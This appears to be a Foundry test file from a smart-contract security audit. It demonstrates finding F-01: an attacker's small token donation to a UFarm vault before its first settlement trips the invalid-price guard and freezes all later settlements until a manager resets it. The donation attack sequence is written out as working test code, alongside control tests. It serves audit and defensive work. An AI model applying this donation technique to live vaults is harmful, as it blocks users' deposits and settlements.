// SPDX-License-Identifier: BUSL-1.1
/// @notice Worker C PoC — FINDING F-01 (donation before first settlement latches the
/// invalid-price guard and freezes all settlements).
///
/// Standalone harness: production contracts copied byte-identical from
/// scope/ @ b19a6511c61157bfd68df1c28f0299e68bde02fb into ../src (+ 4 mock
/// contracts also copied byte-identical). The MockUFarmOracle stands in for the
/// Quex oracle: submitNav delivers the NAV the off-chain backend would report.
/// Key modelling assumption (stated in the finding): the backend NAV counts all
/// tokens held by the vault, so a direct ERC20 donation to the vault address
/// inflates the reported NAV. Pending deposits are NOT in the NAV: they sit in
/// escrow until settlement releases them to the vault.
pragma solidity 0.8.35;

import {Test} from "forge-std/Test.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {UpgradeableBeacon} from "@openzeppelin/contracts/proxy/beacon/UpgradeableBeacon.sol";

import {UFarmCore} from "../src/core/UFarmCore.sol";
import {UFarmEscrow} from "../src/escrow/UFarmEscrow.sol";
import {UFarmCurator} from "../src/curator/UFarmCurator.sol";
import {UFarmVault} from "../src/vault/UFarmVault.sol";
import {VaultLifecycleModule} from "../src/vault/modules/VaultLifecycleModule.sol";
import {VaultAdminConfigModule} from "../src/vault/modules/VaultAdminConfigModule.sol";
import {VaultAdapterGatewayModule} from "../src/vault/modules/VaultAdapterGatewayModule.sol";
import {IUFarmVaultErrors} from "../src/vault/UFarmVaultErrors.sol";
import {MockERC20} from "../src/mocks/MockERC20.sol";
import {MockChainlinkAggregator} from "../src/mocks/MockChainlinkAggregator.sol";
import {MockCreateX} from "../src/mocks/MockCreateX.sol";
import {MockUFarmOracle} from "../src/mocks/MockUFarmOracle.sol";

contract DonationPriceLatchTest is Test {
    uint256 internal constant MEMBER = 1 << 253;
    uint256 internal constant CORE_CURATOR_REGISTRAR = 1 << 0;
    uint256 internal constant CORE_CONFIG_MANAGER = 1 << 1;
    uint256 internal constant CORE_PRICE_GUARD_MANAGER = 1 << 7;
    uint256 internal constant VAULT_SETTLE_MANAGER = 1 << 1;
    uint256 internal constant WAD = 1e18;

    UFarmCore internal core;
    UFarmCurator internal curator;
    MockUFarmOracle internal oracle;
    MockERC20 internal asset;

    address internal authority = address(this);
    address internal registrar = makeAddr("registrar");
    address internal curatorOwner = makeAddr("curatorOwner");
    address internal vaultOwner = makeAddr("vaultOwner");
    address internal settleManager = makeAddr("settleManager");
    address internal guardManager = makeAddr("guardManager");
    address internal owner = makeAddr("owner");
    address internal attacker = makeAddr("attacker");

    function setUp() public {
        // --- deploy core + factory (mirrors scope/test/helpers/deploy-core.ts) ---
        UFarmCore coreImpl = new UFarmCore();
        ERC1967Proxy coreProxy =
            new ERC1967Proxy(address(coreImpl), abi.encodeCall(UFarmCore.initialize, (authority)));
        core = UFarmCore(address(coreProxy));

        UFarmEscrow escrowImpl = new UFarmEscrow();
        ERC1967Proxy escrowProxy =
            new ERC1967Proxy(address(escrowImpl), abi.encodeCall(UFarmEscrow.initialize, (address(core))));

        MockCreateX createX = new MockCreateX();
        UFarmCurator curatorImpl = new UFarmCurator();
        UFarmVault vaultImpl = new UFarmVault();
        VaultLifecycleModule lifecycleModule = new VaultLifecycleModule();
        VaultAdminConfigModule adminConfigModule = new VaultAdminConfigModule();
        VaultAdapterGatewayModule adapterGatewayModule = new VaultAdapterGatewayModule();
        UpgradeableBeacon curatorBeacon = new UpgradeableBeacon(address(curatorImpl), authority);
        UpgradeableBeacon vaultBeacon = new UpgradeableBeacon(address(vaultImpl), authority);

        core.initializeFactory(
            address(escrowProxy), address(createX), address(curatorBeacon), address(vaultBeacon)
        );
        core.initializeCrossChain(31337);
        core.setVaultModule(keccak256("ufarm.vault.module.adapter-gateway"), address(adapterGatewayModule));
        core.setVaultModule(keccak256("ufarm.vault.module.admin-config"), address(adminConfigModule));
        core.setVaultModule(keccak256("ufarm.vault.module.lifecycle"), address(lifecycleModule));

        // --- value token: 18-dec USDC mock, Chainlink feed $1.00, 10% guard ---
        asset = new MockERC20("USD Coin", "USDC", 18);
        MockChainlinkAggregator feed = new MockChainlinkAggregator(8, 100_000_000);
        core.setValueTokenConfig(address(asset), address(feed), 86400, 0.9e18, 1.1e18);
        core.setAllowedPriceFluctuation(WAD / 10); // 10%

        oracle = new MockUFarmOracle();

        core.setPermissionMask(registrar, MEMBER | CORE_CURATOR_REGISTRAR);
        vm.prank(registrar);
        address curatorAddr = core.createCurator(curatorOwner, keccak256("poc-curator"));
        curator = UFarmCurator(curatorAddr);

        asset.mint(owner, 1_000_000);
        asset.mint(attacker, 1_000_000);
    }

    function _newVault(bytes32 salt) internal returns (UFarmVault vault) {
        vm.prank(curatorOwner);
        address vaultAddr =
            curator.createVault(salt, vaultOwner, "PoC Vault", "uPOC", address(asset));
        vault = UFarmVault(payable(vaultAddr));
        core.setVaultOracle(vaultAddr, address(oracle));
        vm.prank(vaultOwner);
        vault.setPermissionMask(settleManager, VAULT_SETTLE_MANAGER);
        address escrow = vault.escrow();
        vm.prank(owner);
        asset.approve(escrow, type(uint256).max);
        vm.prank(attacker);
        asset.approve(escrow, type(uint256).max);
    }

    function _settleWithNav(UFarmVault vault, uint256 nav) internal {
        uint256 allowedAt = vault.settlementAllowedAt();
        if (block.timestamp < allowedAt) vm.warp(allowedAt);
        vm.prank(settleManager);
        vault.settleRequests();
        uint256 requestId = vault.activeOracleRequestId();
        oracle.submitNav(requestId, nav, uint64(block.timestamp));
    }

    function _claimDeposit(UFarmVault vault) internal {
        vm.prank(owner);
        vault.deposit(0, owner, owner);
    }

    function test_DonationBeforeFirstSettlement_LatchesPriceAndFreezesSettlement() public {
        UFarmVault vault = _newVault(keccak256("poc-vault-attack"));

        // 1. Attacker donates 11 units straight to the vault BEFORE any deposit.
        vm.prank(attacker);
        asset.transfer(address(vault), 11);

        // 2. First depositor requests 100; settlement ignores NAV (supply == 0)
        //    and hardcodes lastTokenPrice = $1 even though true price is $1.11.
        vm.prank(owner);
        vault.requestDeposit(100, owner, owner);
        _settleWithNav(vault, 11); // NAV = vault holdings = donation only (deposit still in escrow)
        assertEq(vault.totalSupply(), 100, "first settlement mints 1 share per $1");
        assertEq(asset.balanceOf(address(vault)), 111, "vault holds deposit + donation");
        assertEq(vault.lastTokenPrice(), WAD, "BUG: reference price hardcoded to $1, true price is $1.11");

        // Claim the first deposit: a non-empty claimable bucket blocks new requests.
        _claimDeposit(vault);

        // 3. Second settlement: NAV 111 vs supply 100 -> $1.11/share, +11% > 10% guard.
        vm.prank(owner);
        vault.requestDeposit(10, owner, owner);
        _settleWithNav(vault, 111);
        assertTrue(vault.isInvalidPrice(), "invalid-price latch must be set");
        assertEq(vault.activeOracleRequestId(), 0, "oracle request consumed, settlement skipped");
        assertEq(vault.pendingDepositRequest(0, owner), 10, "pending deposit preserved, not settled");
        assertEq(vault.claimableDepositRequest(0, owner), 0, "nothing claimable from failed settlement");

        // 4. All finance paths now revert until a privileged manual reset.
        vm.prank(settleManager);
        vm.expectRevert(
            abi.encodeWithSelector(IUFarmVaultErrors.OracleFlowError.selector, uint8(8)) // ORACLE_INVALID_PRICE
        );
        vault.settleRequests();

        // 5. User funds are NOT stolen: pending deposit can still be cancelled.
        vm.prank(owner);
        uint256 released = vault.cancelDeposit(owner);
        assertEq(released, 10, "cancel returns the pending deposit");

        // 6. Only the price-guard manager can unblock, by accepting the true NAV.
        core.setPermissionMask(guardManager, MEMBER | CORE_PRICE_GUARD_MANAGER);
        vm.prank(guardManager);
        vault.resetInvalidPrice(111);
        assertFalse(vault.isInvalidPrice(), "latch cleared by manual reset");
        assertEq(vault.lastTokenPrice(), (111 * WAD) / 100, "reference price now the true $1.11");

        // 7. Settlement works again after the reset.
        vm.prank(owner);
        vault.requestDeposit(10, owner, owner);
        _settleWithNav(vault, 111);
        assertFalse(vault.isInvalidPrice(), "settlement succeeds after reset");
        assertEq(vault.claimableDepositRequest(0, owner), 10, "deposit settles after reset");
    }

    function test_Control_NoDonation_SettlesFine() public {
        UFarmVault vault = _newVault(keccak256("poc-vault-control"));

        vm.prank(owner);
        vault.requestDeposit(100, owner, owner);
        _settleWithNav(vault, 0); // first settlement ignores NAV entirely
        assertEq(vault.lastTokenPrice(), WAD, "first reference price $1 is correct here");
        assertEq(vault.totalSupply(), 100);
        _claimDeposit(vault);

        vm.prank(owner);
        vault.requestDeposit(10, owner, owner);
        _settleWithNav(vault, 100); // NAV = vault holdings only; pending 10 still in escrow
        assertFalse(vault.isInvalidPrice(), "no latch without a donation");
        assertEq(vault.claimableDepositRequest(0, owner), 10, "second deposit settles normally");
        assertEq(vault.lastTokenPrice(), WAD, "price stays $1");
    }

    function test_SmallDonationUnderThreshold_NoLatch() public {
        UFarmVault vault = _newVault(keccak256("poc-vault-small"));

        // 5-unit donation on a 100-unit first deposit = 5% true-price move < 10% guard.
        vm.prank(attacker);
        asset.transfer(address(vault), 5);

        vm.prank(owner);
        vault.requestDeposit(100, owner, owner);
        _settleWithNav(vault, 5);
        assertEq(vault.lastTokenPrice(), WAD, "reference price still hardcoded to $1");
        _claimDeposit(vault);

        vm.prank(owner);
        vault.requestDeposit(10, owner, owner);
        _settleWithNav(vault, 105); // true price $1.05, +5% <= 10% guard
        assertFalse(vault.isInvalidPrice(), "sub-threshold donation does not latch");
        assertEq(vault.claimableDepositRequest(0, owner), 10, "deposit settles");
        assertEq(vault.lastTokenPrice(), (105 * WAD) / 100, "reference price updates to true $1.05");
    }
}
